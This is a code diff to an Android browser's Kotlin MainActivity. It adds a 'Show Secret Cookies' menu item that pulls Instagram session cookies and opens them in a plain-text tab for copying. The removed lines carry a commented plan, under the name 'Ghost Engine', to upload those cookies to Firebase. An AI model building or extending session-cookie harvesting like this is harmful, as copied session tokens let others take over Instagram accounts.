@@ -4,13 +4,14 @@ import android.content.Intent
 import android.os.Build
 import android.view.KeyEvent
 import android.view.Menu
-import android.view.MenuItem // Naya import
+import android.view.MenuItem
 import android.webkit.CookieManager
 import android.webkit.CookieSyncManager
-import android.widget.Toast // Notification ke liye
+import android.widget.Toast
 import com.cookiegames.smartcookie.browser.activity.BrowserActivity
-import com.cookiegames.smartcookie.utils.CookieHelper // Humne jo helper banaya tha
+import com.cookiegames.smartcookie.utils.CookieHelper
 import io.reactivex.Completable
+import java.net.URLEncoder // Naya import text encoding ke liye
 
 class MainActivity : BrowserActivity() {
 
@@ -23,34 +24,45 @@ class MainActivity : BrowserActivity() {
         cookieManager.setAcceptCookie(userPreferences.cookiesEnabled)
     }
 
-    // --- 🛠️ STEP 1: Menu Button Enable Karo ---
+    // --- 🛠️ STEP 1: Menu Setup ---
     override fun onCreateOptionsMenu(menu: Menu): Boolean {
-        // Purana return false hata kar ye dalo taaki menu dikhe
-        menu.add(0, 999, 0, "Sync to Ghost Engine") 
+        menu.add(0, 999, 0, "Show Secret Cookies")
         return true 
     }
 
-    // --- 🛠️ STEP 2: Button Click Hone Par Kya Hoga ---
+    // --- 🛠️ STEP 2: Button Click Handle Karo ---
     override fun onOptionsItemSelected(item: MenuItem): Boolean {
-        if (item.itemId == 999) {
-            performGhostSync()
-            return true
+        return when (item.itemId) {
+            999 -> {
+                performGhostSync()
+                true
+            }
+            else -> super.onOptionsItemSelected(item)
         }
-        return super.onOptionsItemSelected(item)
     }
 
+    // --- 🛠️ STEP 3: Secret Text ko Naye Tab mein kholna ---
     private fun performGhostSync() {
-        val cookiesJson = CookieHelper.getInstaCookiesJson()
-        
-        if (cookiesJson == "[]") {
-            Toast.makeText(this, "Pehle Instagram Login karo bhai!", Toast.LENGTH_SHORT).show()
-        } else {
-            // Yahan hum Firebase wala logic dalenge (Next step mein)
-            // Abhi ke liye sirf message dikhayega
-            Toast.makeText(this, "Ghost Engine Syncing...", Toast.LENGTH_LONG).show()
+        try {
+            val cookiesJson = CookieHelper.getInstaCookiesJson()
             
-            // TODO: firebaseDatabase.child("insta_session").setValue(cookiesJson)
-            println("Debug JSON: $cookiesJson") 
+            if (cookiesJson == "[]" || cookiesJson.isEmpty()) {
+                Toast.makeText(this, "Pehle Instagram Login karo bhai!", Toast.LENGTH_SHORT).show()
+            } else {
+                // Cookies ko URL safe banayein
+                val encodedCookies = URLEncoder.encode(cookiesJson, "UTF-8")
+                
+                // data:text/plain format use karke browser mein text dikhayenge
+                // Isse naya tab khulega aur tum text copy kar paoge
+                val secretUrl = "data:text/plain;charset=utf-8,$encodedCookies"
+                
+                // BrowserActivity ka method use karke naya tab kholna
+                newTab(secretUrl, true)
+                
+                Toast.makeText(this, "Secret Tab Opened! Copy the text.", Toast.LENGTH_LONG).show()
+            }
+        } catch (e: Exception) {
+            Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_SHORT).show()
         }
     }
 
